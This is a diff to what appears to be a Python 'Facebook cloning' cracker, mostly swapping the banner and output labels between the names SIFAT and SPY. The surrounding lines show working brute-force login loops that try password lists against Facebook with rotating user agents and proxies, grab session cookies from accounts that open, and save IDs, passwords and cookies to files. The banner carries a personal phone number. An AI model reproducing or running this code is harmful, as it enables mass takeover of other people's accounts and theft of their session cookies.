@@ -209,21 +209,26 @@ head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "No
 
 	
 
-logo = """\x1b[1;93m                                                                         
- _______ _________ _______  _______ _________
-(  ____ \\__   __/(  ____ \(  ___  )\__   __/
-| (    \/   ) (   | (    \/| (   ) |   ) (   
-| (_____    | |   | (__    | (___) |   | |   
-(_____  )   | |   |  __)   |  ___  |   | |   
-      ) |   | |   | (      | (   ) |   | |   
-/\____) |___) (___| )      | )   ( |   | |   
-\_______)\_______/|/       |/     \|   )_(   
-                                             
+logo = """\x1b[1;93m
+                                                                                    
+────────────────────────────────────────────────────────────────────────────
+─██████████████──██████████──██████████████──██████████████──██████████████─
+─██░░░░░░░░░░██──██░░░░░░██──██░░░░░░░░░░██──██░░░░░░░░░░██──██░░░░░░░░░░██─
+─██░░██████████──████░░████──██░░██████████──██░░██████░░██──██████░░██████─
+─██░░██────────────██░░██────██░░██──────────██░░██──██░░██──────██░░██─────
+─██░░██████████────██░░██────██░░██████████──██░░██████░░██──────██░░██─────
+─██░░░░░░░░░░██────██░░██────██░░░░░░░░░░██──██░░░░░░░░░░██──────██░░██─────
+─██████████░░██────██░░██────██░░██████████──██░░██████░░██──────██░░██─────
+─────────██░░██────██░░██────██░░██──────────██░░██──██░░██──────██░░██─────
+─██████████░░██──████░░████──██░░██──────────██░░██──██░░██──────██░░██─────
+─██░░░░░░░░░░██──██░░░░░░██──██░░██──────────██░░██──██░░██──────██░░██─────
+─██████████████──██████████──██████──────────██████──██████──────██████─────
+────────────────────────────────────────────────────────────────────────────                                           
     \033[1;34m───────────────────────────────────────
-    \033[1;31m[ \033[1;32mCODED BY \033[1;31m] \033[1;35m<>  \033[1;32mSIFAT AHOMMED 
-    \033[1;31m[ \033[1;32mPROGRAME \033[1;31m] \033[1;35m<>  \033[1;32mFACEBOOK CLONING 
+    \033[1;31m[ \033[1;32mCODED BY   \033[1;31m] \033[1;35m<>  \033[1;32m SIFAT AHOMMED 
+    \033[1;31m[ \033[1;32mPROGRAME \033[1;31m] \033[1;35m<>  \033[1;32mFACEBOOK  CLONING 
     \033[1;31m[ \033[1;32mWHATSAPP \033[1;31m] \033[1;35m<> \033[1;32m +8801701613050
-    \033[1;31m[ \033[1;32mGITGUB   \033[1;31m] \033[1;35m<> \033[1;32m SIFAT-ZX
+    \033[1;31m[ \033[1;32mGITHUB         \033[1;31m] \033[1;35m<> \033[1;32m SIFAT-ZX
     \033[1;34m───────────────────────────────────────\033[1;37m"""
 def clear():
     os.system("clear")
@@ -327,7 +332,7 @@ def fucked():
 	print(' Fuck You Bypass User ');exit()
 def ckxx():
 	uuid = str(os.geteuid()) + str(os.getlogin())
-	id = 'SPYPAID'
+	id = 'SIFATPAID'
 	server = requests.get(f'{tan}://{iya}.com/F{ani}122/vip/blob/main/a.txt').text
 	try:
 		httpCaht = requests.get(f"{tan}://{iya}.com/F{ani}122/vip/blob/main/c.txt").text
@@ -499,7 +504,7 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                     print(f"\r{R} [SIFAT-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SIFAT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SIFAT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SIFAT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A} [SIFAT-CP] {sid} | {ps} {S}")
@@ -1030,7 +1035,7 @@ def ccrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.SPY-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.SIFAT-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
@@ -1081,7 +1086,7 @@ def ccrack(uid,pwx,tl):
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
-				print('\033[1;92m[SIFAT-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[SPY-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('SIFAT-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(uid)
 				break
@@ -1099,7 +1104,7 @@ def bcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.SIFAT-RNDM>M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.SPY-RNDM>M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen2)
 			nip=random.choice(prox)
@@ -1140,7 +1145,7 @@ def bcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[65:80]
-				print('\033[1;92m[SIFAT-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[SPY-OK] '+cid+' | '+ps+'\033[1;32m')
 				print(f' Number or Email : {uid}')
 				print(f' Cookie : {coki}')
 				open('SIFAT-VIP-OK.txt', 'a').write(cid+' | '+ps+'\n')
@@ -1208,7 +1213,7 @@ def acrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[65:80]
-				print('\033[1;92m[SIFAT-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[SPY-OK] '+cid+' | '+ps+'\033[1;32m')
 				print(f' Number or Email : {uid}')
 				print(f' Cookie : {coki}')
 				#cek_apk(session,coki)
@@ -1218,7 +1223,7 @@ def acrack(uid,pwx,tl):
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
-				print('\33[1;31m[SIFAT-CP] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;31m[SPY-CP] '+cid+' | '+ps+'\33[0;97m')
 				open('SIFAT-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
